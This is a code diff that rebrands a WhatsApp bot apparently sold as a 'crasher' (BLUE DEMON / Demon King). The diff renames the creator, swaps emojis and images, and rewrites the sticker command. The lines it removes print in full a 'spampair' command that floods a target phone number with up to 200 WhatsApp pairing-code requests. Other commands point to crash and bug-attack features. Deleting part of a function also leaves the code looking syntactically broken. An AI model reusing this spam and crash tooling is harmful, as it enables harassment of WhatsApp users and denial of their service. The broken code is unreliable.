@@ -1,6 +1,6 @@
 /*
  CREATOR
- @rafztamvan
+ @DEMON KING
 */
 module.exports = async (zyn, m, store) => {
 try {
@@ -13,6 +13,7 @@ const isCmd = body.startsWith(prefix)
 const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() //kalau mau no prefix ganti jadi ini : const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
 const args = body.trim().split(/ +/).slice(1)
 const mime = (quoted.msg || quoted).mimetype || ''
+const axios = require('axios');
 const text = q = args.join(" ")
 const isGroup = from.endsWith('@g.us')
 const botNumber = await zyn.decodeJid(zyn.user.id)
@@ -80,11 +81,11 @@ await zyn.sendMessage(`${global.owner}@s.whatsapp.net`, {text: `*BUG MESSAGE DET
 *Number* ${m.sender.split("@")[0]}`}, {quoted: null})
 }}
   const nanototalpitur = () => {
-            var mytext = fs.readFileSync("./bluexdemon.js").toString()
+            var mytext = fs.readFileSync("./demontech.js").toString()
             var numUpper = (mytext.match(/case '/g) || []).length
             return numUpper
         }
-const themeemoji = "🔪"
+const themeemoji = "👾"
 // Random Color
 const listcolor = ['red','green','yellow','blue','magenta','cyan','white']
 const randomcolor = listcolor[Math.floor(Math.random() * listcolor.length)]
@@ -98,13 +99,6 @@ function runtime(seconds) {
 let run = runtime(process.uptime())
 let runx = runtimex(process.uptime());
 
-async function ephoto(url, texk) {
-let form = new FormData 
-let gT = await axios.get(url, {
-  headers: {
-    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
-  }
-})
 // Command Yang Muncul Di Console
 if (isCmd) {
 console.log(chalk.white.blue.bold('RECIEVED COMMAND'), color(`[ 𝙱𝙻𝚄𝙴 𝙳𝙴𝙼𝙾𝙽 ]`, `blue`), color(`FROM`, `red`), color(`${pushname}`, `red`), color(`Text :`, `yellow`), color(`${body}`, `blue`))
@@ -118,25 +112,25 @@ console.log(chalk.white.blue.bold('RECIEVED COMMAND'), color(`[ 𝙱𝙻𝚄𝙴
 
         const time2 = moment().tz('Africa/Lagos').format('HH:mm:ss')
         if (time2 < "23:59:00") {
-            var ucapanWaktu = 'wagwan 🏙️'
+            var ucapanWaktu = 'wagwan 👾'
         }
         if (time2 < "19:00:00") {
-            var ucapanWaktu = 'wagwan  🌆'
+            var ucapanWaktu = 'wagwan  👾'
         }
         if (time2 < "18:00:00") {
-            var ucapanWaktu = 'wagwan  🌇'
+            var ucapanWaktu = 'wagwan  👾'
         }
         if (time2 < "15:00:00") {
-            var ucapanWaktu = 'wagwan 🌤️'
+            var ucapanWaktu = 'wagwan 👾'
         }
         if (time2 < "10:00:00") {
-            var ucapanWaktu = 'wagwan 🌄'
+            var ucapanWaktu = 'wagwan 👾'
         }
         if (time2 < "05:00:00") {
-            var ucapanWaktu = 'wagwan 🌆'
+            var ucapanWaktu = 'wagwan 👾'
         }
         if (time2 < "03:00:00") {
-            var ucapanWaktu = 'wagwan  🌃'
+            var ucapanWaktu = 'wagwan  👾'
         }
        
     zyn.autoshalat = zyn.autoshalat ? zyn.autoshalat : {}
@@ -176,7 +170,7 @@ contextInfo: {
         title: `𝕯𝖊𝖒𝖔𝖒 𝖐𝖎𝖓𝖌👾`,
         body: `𝐃𝐄𝐌𝐎𝐍-𝐕𝟑🎧`,
         sourceUrl: '',
-        thumbnail: await fs.readFileSync('./database/image/jadwal.jpg'),
+        thumbnail: await fs.readFileSync('./database/image/hmm.jpg'),
         renderLargerThumbnail: true
     }
 }
@@ -197,7 +191,6 @@ const ownerNumber = JSON.parse(fs.readFileSync("./database/dtbs/owner.json"))
 const isContacts = contacts.includes(sender)
 const isPremium = prem.includes(sender)
 const isOwner = ownerNumber.includes(senderNumber) || isBot
-
 // BUTTON VIDEO
    zyn.sendButtonVideo = async (jid, buttons, quoted, opts = {}) => {
       var video = await prepareWAMessageMedia({
@@ -587,14 +580,7 @@ if (!m.key.fromMe) return
 async function loading () {
 var baralod = [
 "Ɑ͞ ̶͞ ̶͞ඩ", 
-"Ɑ͞ ̶͞ ̶͞ඩⱭ͞ ̶͞ ̶͞ඩ", 
-"Ɑ͞ ̶͞ ̶͞ඩⱭ͞ ̶͞ ̶͞ඩⱭ͞ ̶͞ ̶͞ඩ", 
-"Ɑ͞ ̶͞ ̶͞ඩⱭ͞ ̶͞ ̶͞ඩⱭ͞ ̶͞ ̶͞ඩⱭ͞ ̶͞ ̶͞ඩ",
-"Ɑ͞ ̶͞ ̶͞ඩⱭ͞ ̶͞ ̶͞ඩⱭ͞ ̶͞ ̶͞ඩⱭ͞ ̶͞ ̶͞ඩⱭ͞ ̶͞ ̶͞ඩ", 
-"Ɑ͞ ̶͞ ̶͞ඩⱭ͞ ̶͞ ̶͞ඩⱭ͞ ̶͞ ̶͞ඩⱭ͞ ̶͞ ̶͞ඩⱭ͞ ̶͞ ̶͞ඩⱭ͞ ̶͞ ̶͞ඩ", 
-"Ɑ͞ ̶͞ ̶͞ඩⱭ͞ ̶͞ ̶͞ඩⱭ͞ ̶͞ ̶͞ඩⱭ͞ ̶͞ ̶͞ඩⱭ͞ ̶͞ ̶͞ඩⱭ͞ ̶͞ ̶͞ඩⱭ͞ ̶͞ ̶͞ඩ", 
-"*_LOADING_*",
-"*_SUKSSES FULL TO KUNTUL VERSION [3.0]_*", 
+"Ɑ͞ ̶͞ ̶͞ඩⱭ͞ ̶͞ ̶͞ඩ",
 ]
 let { key } = await zyn.sendMessage(from, {text: '𝐑'})
 
@@ -647,7 +633,7 @@ const reply = (teks) => {
                         "title": `ʙʟᴜᴇ ᴄʀᴀꜱʜᴇʀ`,
                         "body": `${ucapanWaktu} ${pushname}`,
                         "previewType": "PHOTO",
-                        "thumbnailUrl": `https://l.top4top.io/s_32188bbq00.jpg`, // Replace with your image URL
+                        "thumbnailUrl": `https://l.top4top.io/s_32310ywi80.jpeg`, // Replace with your image URL
                         "thumbnail": null, // You can set this to null since you are using thumbnailUrl
                         "sourceUrl": `${isLink}`
                     }
@@ -1701,7 +1687,7 @@ case 'tag':
             }
 case 'tagall': {
                 if (!m.isGroup) return reply(mess.only.group);
-                if (!isOwner && !iisAdmin) return reply(mess.only.admin);
+                if (!isOwner && !isAdmin) return reply(mess.only.admin);
 
                 // Check if the sender is the owner
                 if (!isOwner) return reply(mess.only.owner);
@@ -2181,6 +2167,41 @@ case 'getip':
                 }
                 break;
             }
+  case 'sticker':
+            case 's': {
+                if (!isOwner) return reply(mess.only.owner); // Check if the user is the owner
+                if (!quoted) return reply(`Send/Reply to Images/Videos/Gifs with the caption ${prefix + command}\nVideo Duration: 1-9 Seconds`); // Ensure there’s a quoted message
+
+                try {
+                    let mime = quoted.mimetype || '';
+
+                    if (/image/.test(mime)) { // If the quoted message is an image
+                        let media = await quoted.download(); // Download the image
+                        await zyn.sendStimg(m.chat, media, m, {
+                            packname: global.packname,
+                            author: global.author
+                        }); // Send the image as a sticker
+
+                    } else if (/video/.test(mime)) { // If the quoted message is a video
+                        if ((quoted.msg || quoted).seconds > 9) { // Check video length (should be 1-9 seconds)
+                            return reply(`Send/Reply to Images/Videos/Gifs with the caption ${prefix + command}\nVideo Duration: 1-9 Seconds`);
+                        }
+                        let media = await quoted.download(); // Download the video
+                        await zyn.sendStvid(m.chat, media, m, {
+                            packname: global.packname,
+                            author: global.author
+                        }); // Send the video as a sticker
+
+                    } else {
+                        reply(`Send/Reply to Images/Videos/Gifs with the caption ${prefix + command}\nVideo Duration: 1-9 Seconds`); // Handle unsupported media
+                    }
+
+                } catch (error) {
+                    console.error(error);
+                    reply("An error occurred while processing the sticker. Please try again.");
+                }
+            }
+            break;
 case 'hrt':
             case 'love': {
                 if (!isOwner) return bluereply(mess.owner);
@@ -2332,13 +2353,6 @@ case 'glitchtext':
             case 'lighteffects': {
 
                 if (!q) return reply(`Example : ${prefix+command} BLUE DEMON`)
-                async function ephoto(url, texk) {
-let form = new FormData 
-let gT = await axios.get(url, {
-  headers: {
-    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
-  }
-})
                 bluereply(mess.wait)
                 let link
                 if (/glitchtext/.test(command)) link = 'https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html'
@@ -2382,10 +2396,6 @@ let gT = await axios.get(url, {
                 })
             }
             break
-
-
-
-
 
 
 
@@ -2704,46 +2714,6 @@ dropNumber()
 }
 break
 
-case 'spampair': {
-const usePairingCode = true
-const NodeCache = require("node-cache")
-const resolveMsgBuffer = new NodeCache()
-			if (!isOwner) return
-			if (!q) return reply(`*Syntax Error!*\n\n_Use : Spampair NUMBER|AMOUNT_\n_Example : Spampair 62xx_`)
-			let [peenis, pepekk = "200"] = q.split("|")
-			await reply(`</> 𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙥𝙖𝙢 𝘾𝙤𝙙𝙚〽️`)
-			await reaction(m.chat, "✅")
-			let target = peenis.replace(/[^0-9]/g, '').trim()
-			let {
-				default: makeWaSocket,
-				useMultiFileAuthState,
-				fetchLatestBaileysVersion
-			} = require('@whiskeysockets/baileys')
-			let {
-				state
-			} = await useMultiFileAuthState('pairSess')
-			let {
-				version
-			} = await fetchLatestBaileysVersion()
-			let sucked = await makeWaSocket({
-				auth: state,
-				browser: ['Mac Os', 'chrome', '121.0.6167.159'],
-version: [2, 2413, 1],
-keepAliveIntervalMs: 50000,
-printQRInTerminal: !usePairingCode,
-generateHighQualityLinkPreview: true,
-resolveMsgBuffer,
-				logger: pino({ level: "silent" }),
-					level: 'fatal'
-				})
-			for (let i = 0; i < pepekk; i++) {
-			await sleep(2000)
-				let prc = await sucked.requestPairingCode(target)
-				await console.log(`# Succes Spam Pairing Code - Number : ${target} - Code : ${prc}`)
-			}
-			await sleep(2000)
-		}
-		break
 
 case 'antibugon': {
 if (!isOwner) return reply("Fitur Khusus User Tertentu!!") 
@@ -2773,25 +2743,6 @@ return reply(`🥶`)
 }
 break
 
-case "sticker": 
-case "stiker":
-case "s": {
-if (!isOwner) return reply(mess.only.owner)
-if (!quoted) return reply(`Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik`)
-if (/image/.test(mime)) {
-let media = await quoted.download()
-let encmedia = await zyn.sendStimg(from, media, m, { packname: global.packname, author: global.author })
-await fs.unlinkSync(encmedia)
-} else if (/video/.test(mime)) {
-if ((quoted.msg || quoted).seconds > 11) return reply('Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik')
-let media = await quoted.download()
-let encmedia = await zyn.sendStvid(from, media, m, { packname: global.packname, author: global.author })
-await fs.unlinkSync(encmedia)
-} else {
-reply(`Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik`)
-}
-}
-break
 
 case 'stuk': case 'flow': 
 if (!isPremium) return reply(mess.only.premium)
